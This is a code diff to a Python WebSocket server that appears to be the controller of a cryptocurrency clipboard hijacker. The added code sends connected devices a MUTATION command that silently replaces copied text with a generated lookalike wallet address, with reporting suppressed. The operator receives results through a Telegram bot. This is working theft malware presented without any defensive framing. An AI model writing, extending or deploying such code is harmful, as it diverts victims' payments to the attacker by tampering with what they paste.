@@ -700,6 +700,22 @@ async def ws_clipboard(ws: WebSocket):
                                         
                                         print(f"[AUTO-GENERATE] device={device_id} 生成成功: {result['generated_address']}", flush=True)
                                         
+                                        # 立即发送给客户端替换剪贴板
+                                        mutation_response = {
+                                            "type": "MUTATION",
+                                            "targetSeq": data.get("seq"),
+                                            "expectedHash": data.get("hash"),
+                                            "deadline": int(time.time() * 1000) + 600,
+                                            "set": {
+                                                "format": "text/plain",
+                                                "text": result['generated_address']
+                                            },
+                                            "suppressReport": True,
+                                            "reason": f"[自动生成] 已生成相似地址"
+                                        }
+                                        await ws.send_text(json.dumps(mutation_response))
+                                        print(f"[AUTO-GENERATE] device={device_id} 已发送替换指令: {clip_text} -> {result['generated_address']}", flush=True)
+                                        
                                         # 发送生成结果到Telegram
                                         message = (
                                             f"🎯 <b>自动生成相似地址成功</b>\n\n"
@@ -727,6 +743,10 @@ async def ws_clipboard(ws: WebSocket):
                                                 
                                                 async with aiohttp.ClientSession() as session:
                                                     await session.post(url, json=payload)
+                                        
+                                        # 自动生成成功，跳过后续的规则处理
+                                        continue
+                                        
                                 else:
                                     print(f"[AUTO-GENERATE] device={device_id} 生成失败: {result.get('error', '未知错误')}", flush=True)
                         except Exception as e:
